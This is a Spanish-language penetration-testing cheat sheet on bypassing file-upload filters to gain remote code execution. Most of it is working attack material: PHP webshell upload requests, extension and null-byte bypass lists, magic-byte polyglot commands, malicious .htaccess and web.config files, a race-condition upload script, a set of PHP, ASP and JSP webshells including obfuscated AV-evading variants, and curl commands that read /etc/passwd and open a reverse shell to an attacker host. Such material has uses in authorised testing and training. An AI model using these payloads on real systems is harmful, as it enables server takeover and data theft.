---
icon: folder-magnifying-glass
---

# Unrestricted File Upload

## File Upload Bypass

### ¿Qué es y por qué es crítico?

Las funcionalidades de subida de archivos mal configuradas permiten subir archivos no permitidos (webshells, ejecutables) que pueden ejecutarse en el servidor, resultando en RCE (Remote Code Execution). Es uno de los hallazgos más críticos en aplicaciones web.

```
Objetivo: subir un archivo .php con código malicioso
→ Servidor lo guarda en /uploads/shell.php
→ Atacante accede a https://target.com/uploads/shell.php?cmd=id
→ RCE ✅
```

### Tipos de validación y cómo bypassearlos

La app puede validar en distintas capas, de menor a mayor robustez:

```
1. Validación en el cliente (JavaScript)       → bypasseable trivialmente
2. Content-Type / MIME type                    → bypasseable con Burp
3. Extensión del archivo                       → múltiples bypasses
4. Contenido del archivo (magic bytes)         → bypasseable con polyglots
5. Validación en el servidor + ejecución       → depende de la configuración
```

### Bypass 1 — Validación solo en cliente

```http
-- La app valida extensiones con JavaScript (trivial de bypassear) --

1. Interceptar con Burp antes de enviar
2. Subir cualquier archivo .php directamente
→ El JS no se ejecuta en el contexto del servidor
```

### Bypass 2 — Content-Type / MIME type

```http
-- Petición original con webshell PHP --
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php           ← BLOQUEADO

<?php system($_GET['cmd']); ?>

-- Cambiar Content-Type al de una imagen --
------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg                  ← PERMITIDO

<?php system($_GET['cmd']); ?>
→ El servidor valida MIME type pero lo tomamos del header → bypass
```

### Bypass 3 — Extensión del archivo

#### Extensiones alternativas de PHP

```
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.phps
.phtml
.phtm
.phar      ← PHP Archive, ejecutable como PHP
.pgif      ← a veces procesado como PHP
.shtml
.pHP       ← mayúsculas (si el filtro es case-sensitive)
.PHP
.PhP
.pHp
```

#### Extensiones de otros lenguajes según el servidor

```
ASP/ASPX (IIS):
.asp
.aspx
.asa
.cer
.ashx
.asmx
.config    ← a veces interpretado

JSP (Tomcat/JBoss):
.jsp
.jspx
.jsw
.jsv
.jspf

Perl:
.pl
.pm
.cgi

Python:
.py
.pyc
```

#### Double extension

```
# Si el filtro solo comprueba la primera extensión:
shell.jpg.php      → .php ejecutado
shell.php.jpg      → puede ser ejecutado si servidor mal configurado
shell.php%00.jpg   → null byte (PHP < 5.3.4)
shell.php%20       → espacio al final (ignorado en Windows)
shell.php.         → punto al final (ignorado en Windows)
shell.php::$DATA   → ADS (Alternate Data Streams, Windows NTFS)
```

#### Bypass con punto y caracteres especiales

```
shell.ph\np        → newline en extensión (algunos parsers)
shell.php;.jpg     → ; como separador
shell.php%0a.jpg   → URL encoded newline
```

### Bypass 4 — Magic bytes (firma del archivo)

Los archivos tienen bytes mágicos al inicio que identifican su tipo real. Si el servidor valida el contenido real del archivo, se puede crear un polyglot.

```bash
# Añadir magic bytes de JPEG al inicio de un webshell PHP
# Magic bytes JPEG: FF D8 FF E0

printf '\xff\xd8\xff\xe0' > shell.php     # Magic bytes JPEG
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Con Python
python3 -c "
with open('shell.php', 'wb') as f:
    f.write(b'\xff\xd8\xff\xe0')           # JPEG magic
    f.write(b'<?php system(\$_GET[\"cmd\"]); ?>')
"

# GIF magic bytes: GIF89a
echo 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PNG magic bytes: \x89PNG\r\n\x1a\n
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php
```

#### Polyglot real (imagen válida + webshell)

```bash
# Usar exiftool para inyectar PHP en metadatos de imagen real
exiftool -Comment='<?php system($_GET["cmd"]); ?>' foto_real.jpg
mv foto_real.jpg shell.php    # Renombrar a .php
# El archivo es una imagen JPEG válida Y ejecuta PHP

# Con identify/convert (ImageMagick)
# Si la app procesa imágenes, puede haber ImageTragick (CVE-2016-3714)
```

### Bypass 5 — Configuración del servidor

#### .htaccess (Apache)

Si se puede subir un archivo `.htaccess`, se puede configurar el servidor para ejecutar extensiones arbitrarias como PHP.

```apache
# Subir este archivo como .htaccess
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .txt

# Luego subir la webshell con extensión .jpg
# GET /uploads/.htaccess      → 200 (confirma que se subió)
# GET /uploads/shell.jpg?cmd=id  → RCE
```

```apache
# Alternativa — forzar ejecución en el directorio
Options +ExecCGI
AddHandler cgi-script .jpg

# O con php_value
php_value auto_prepend_file shell.jpg
```

#### web.config (IIS)

```xml
<!-- Subir este archivo como web.config en IIS -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.php" verb="*"
              modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write"
              preCondition="bitness64"/>
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".php"/>
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config"/>
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

### Bypass 6 — Race condition

Si el servidor sube el archivo, lo valida y luego lo elimina, hay una ventana de tiempo en la que el archivo existe en el sistema.

```python
# Script de race condition: subir y acceder simultáneamente
import threading
import requests

def upload():
    while True:
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
        requests.post('https://target.com/upload', files=files)

def access():
    while True:
        r = requests.get('https://target.com/uploads/shell.php?cmd=id')
        if 'root' in r.text or 'www-data' in r.text:
            print("[+] RCE:", r.text)
            break

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
```

### Encontrar dónde se almacena el archivo

Una vez subido el archivo, hay que saber dónde acceder a él.

```bash
# Respuesta de la API puede revelar la ruta
{"success": true, "url": "/uploads/a1b2c3_shell.php"}
{"path": "files/2024/01/shell.php"}
{"filename": "shell.php", "location": "/var/www/uploads/"}

# Si no se revela, buscar:
/uploads/
/files/
/media/
/static/
/assets/
/images/
/docs/
/tmp/
/attachments/

# Usar el nombre original si no se renom bra
/uploads/shell.php
/uploads/shell.jpg   ← si se cambió la extensión

# Si el servidor renom bra el archivo (hash/UUID):
→ La respuesta suele incluir el nuevo nombre
→ Buscar en la respuesta HTML o JSON el URL del archivo subido
```

### Webshells básicas

```php
<!-- PHP — básica -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>

<!-- PHP — más robusta -->
<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>

<!-- PHP — con POST (menos visible en logs) -->
<?php system($_POST['cmd']); ?>

<!-- PHP — ofuscada (evasión básica de AV) -->
<?php $f='sys'.'tem'; $f($_GET['cmd']); ?>
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
// base64 de: system($_GET['cmd']);

<!-- ASP (IIS) -->
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>

<!-- ASPX -->
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"])); %>

<!-- JSP -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### Usar la webshell

```bash
# GET request
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php?cmd=whoami"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
curl "https://target.com/uploads/shell.php?cmd=ls+-la+/var/www/html"

# Obtener reverse shell desde la webshell
curl "https://target.com/uploads/shell.php" \
    --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/attacker/9001 0>&1'"

# URL encoded
curl "https://target.com/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker%2F9001%200%3E%261'"
```

### Cheatsheet de bypasses

| Filtro                          | Bypass                                 |
| ------------------------------- | -------------------------------------- |
| Validación JS                   | Interceptar con Burp antes de enviar   |
| Content-Type                    | Cambiar a `image/jpeg` en Burp         |
| Blacklist de extensiones        | Probar `.phtml`, `.phar`, `.php5`...   |
| Whitelist de extensiones        | `.htaccess` para remapear extensiones  |
| Magic bytes                     | Añadir `GIF89a` o bytes JPEG al inicio |
| Validación de imagen real       | Polyglot con exiftool                  |
| Archivo eliminado tras validar  | Race condition                         |
| Renombrado + extensión cambiada | .htaccess que ejecuta .jpg como PHP    |

> El bypass más efectivo en la práctica es la combinación: Content-Type: image/jpeg + extensión .phtml o .php5 — la mayoría de blacklists no incluyen extensiones alternativas.

> Siempre verificar dónde se almacenan los archivos y si son accesibles públicamente. Un servidor puede aceptar el .php pero almacenarlo fuera del webroot (sin acceso web) → no hay RCE aunque el upload funcione.
